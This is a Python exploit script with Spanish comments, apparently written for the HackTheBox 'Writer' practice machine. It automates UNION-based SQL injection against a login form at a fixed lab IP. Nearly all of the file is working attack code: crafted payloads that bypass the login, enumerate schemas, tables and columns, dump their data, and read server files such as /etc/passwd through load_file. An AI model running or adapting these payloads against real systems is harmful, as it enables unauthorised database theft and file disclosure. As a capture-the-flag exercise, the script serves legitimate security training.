#!/usr/bin/python3

import requests
import argparse
import signal
import base64
import sys
import re

# Variables globales
URL = "http://10.10.11.101/administrative"

# Clases
class Color:  # damos colorines a la vida
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    WHITE = '\033[1;37m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

class BienMal:
    MAL = '\033[91m' + "Nada para mostrar..." + '\033[0m'

# Funciones
def exit2calle(sig, frame):  # controlamos salida forzada con Ctrl^C
    print(Color.RED + "\nInterrupción, saliendo...\n" + Color.END)
    exit(0)

signal.signal(signal.SIGINT, exit2calle)

def arguments():
    parse = argparse.ArgumentParser()
    parse.add_argument('-e', '--env', dest="environment", type=str, help="Variable del servicio MySQL a consultar.")
    parse.add_argument('-f', '--file', dest="file_name", type=str, help="Archivo del sistema al cual extraerle su contenido.")
    parse.add_argument('-q', '--query', dest="dump", nargs="*", help="Consulta MySQL: descubre db, tablas, columnas y sus datos.")
    return parse.parse_args()

def make_sqli(payload):
    r = requests.post(URL, data={"uname":payload,"password":"hola"})

    if "Redirecting you to the dashboard" in r.text:
        result = re.findall(r'<h3 class="animation-slide-top">(.*?)<', str(r.content))[0].replace("Welcome admin", "")

        if result == "None": 
            return "1"

        return result.replace("\\n","\n").replace("\\r","\r").replace("\\t","\t").replace("&gt;",">").replace("&lt;","<").replace("&#34;","\"").replace("&#39;","'").rstrip()
    else:
        return "1"

def show_env(env_var):
    print("[*] Consultando {0}\n".format(Color.CYAN + env_var + Color.END))

    payload = f"admin' UNION ALL SELECT 1,{env_var},3,4,5,6;#"
    env_result = make_sqli(payload)

    if env_result == "1":
        print(BienMal.MAL)
    else:
        print(Color.GREEN + env_result + Color.END)

def show_file(filename):
    print("[+] Leyendo el archivo {0}\n".format(Color.CYAN + filename + Color.END))

    payload = f"admin' UNION ALL SELECT 1,load_file('{filename}'),3,4,5,6;#"
    file_content = make_sqli(payload)

    if file_content == "1":
        print(BienMal.MAL)
    else:
        print(Color.GREEN + file_content + Color.END)

def show_databases():
    print("[*] Dumpeando las bases de datos actuales del servicio MySQL.\n")

    for row in range(101):  # Si quieres listar muuuuchas más tablas (por ejemplo de 'information_schema'), debes aumentar el rango...
        payload = f"admin' UNION ALL SELECT 1,(SELECT schema_name FROM information_schema.schemata LIMIT {row},1),3,4,5,6;#"
        databases = make_sqli(payload)

        if row == 0 and databases == "1":
            print(BienMal.MAL)
            break
        elif databases == "1":
            break

        print(f"[+] {Color.GREEN + databases + Color.END}")

def show_tables(db):
    print("[*] Dumpeando las tablas de la base de datos {0}\n".format(Color.CYAN + db[0] + Color.END))

    for row in range(101):
        payload = f"admin' UNION ALL SELECT 1,(SELECT table_name FROM information_schema.tables WHERE table_schema='{db[0]}' LIMIT {row},1),3,4,5,6;#"
        tables = make_sqli(payload)

        if row == 0 and tables == "1":
            print(BienMal.MAL)
            break
        elif tables == "1":
            break

        print(f"[+] {Color.GREEN + tables + Color.END}")

def show_columns(db_table):
    print("[*] Dumpeando las columnas de la tabla {0} de la base de datos {1}\n".format(Color.CYAN + db_table[1] + Color.END, Color.CYAN + db_table[0] + Color.END))

    for row in range(101):
        payload = f"admin' UNION ALL SELECT 1,(SELECT column_name FROM information_schema.columns WHERE table_schema='{db_table[0]}' AND table_name='{db_table[1]}' LIMIT {row},1),3,4,5,6;#"
        columns = make_sqli(payload)

        if row == 0 and columns == "1":
            print(BienMal.MAL)
            break
        elif columns == "1":
            break

        print(f"[+] {Color.GREEN + columns + Color.END}")

def show_data(db_table_column):
    print("[*] Dumpeando {2} de {0}.{1}\n".format(Color.CYAN + db_table_column[0] + Color.END, Color.CYAN + db_table_column[1] + Color.END, Color.CYAN + db_table_column[2] + Color.END))

    list_columns = db_table_column[2].split(",")  # Dividimos la cadena según las comas (,) así sabemos que columnas concatenar
    columns2concat = ",'-',".join(list_columns)

    for row in range(101):
        payload = f"admin' UNION ALL SELECT 1,(SELECT CONCAT({columns2concat}) FROM {db_table_column[0]}.{db_table_column[1]} LIMIT {row},1),3,4,5,6;#"
        data = make_sqli(payload)

        if row == 0 and data == "1":
            print(BienMal.MAL)
            break
        elif data == "1":
            break

        print(f"[+] {Color.GREEN + data + Color.END}")

def print_help():
    print(f"uso: {sys.argv[0]} [-h] [-e ENVIRONMENT] [-f FILE_NAME] [-q [DUMP ...]]")
    print("\nOpciones:")
    print("  -e, --env     Variable del servicio MySQL a consultar.")
    print("  -f, --file    Archivo del sistema al cual extraerle su contenido.")
    print("  -q, --query   Consulta MySQL: descubre db, tablas, columnas y sus datos.")
    print("\nEjemplos:")
    print(f"  {sys.argv[0]} --env 'version()'")
    print(f"  {sys.argv[0]} --file '/etc/passwd'")
    print(f"  {sys.argv[0]} --query (to extract databases)")
    print(f"  {sys.argv[0]} --query db_name (to extract tables)")
    print(f"  {sys.argv[0]} --query db_name table_name (to extract columns)")
    print(f"  {sys.argv[0]} --query db_name table_name column_name1/column_name1,column_name2 (to extract/concat data)")

def main():
    banner = base64.b64decode("CuKVpeKVk+KVluKVpeKVk+KUgOKUgOKVluKUgOKVpeKUgCDilZPilIDilIDilZbilZPilIDilIAg4pWT4pSA4pSA4pWWCuKVkeKVq+KVkeKVkeKVkeKUgOKUgOKVnCDilZEgIOKVmSDilZHilZzilZEgICDilZHilIDilIDilZwK4pWR4pWr4pWR4pWR4pWr4pSA4pSA4pWWIOKVkSAgICDilZEg4pWr4pSA4pSAIOKVq+KUgOKUgOKVlgrilZnilZzilZnilZzilaggIOKVqOKUgOKVqOKUgOKUgCDilIDilagg4pWZ4pSA4pSA4pSA4pWoICDilajigKIgYnkgbGFuegoKSGFja1RoZUJveCAtIFdyaXRlcjogU1FMaW5qZWN0aW9uIFVuaW9uLUJhc2VkIGVuIE15U1FMCg==").decode()
    print(Color.DARKCYAN + banner + Color.END)

    args = arguments()

    try:
        if args.environment:
            show_env(args.environment)
        elif args.file_name:
            show_file(args.file_name)
        elif len(args.dump) == 0:
            show_databases()
        elif len(args.dump) == 1:
            show_tables(args.dump)
        elif len(args.dump) == 2:
            show_columns(args.dump)
        elif len(args.dump) == 3:
            show_data(args.dump)
        else:
            print_help()
    except TypeError:  #Evitamos error al dumpear: object of type 'NoneType' has no len()
        print_help()

if '__main__' == __name__:
    main()
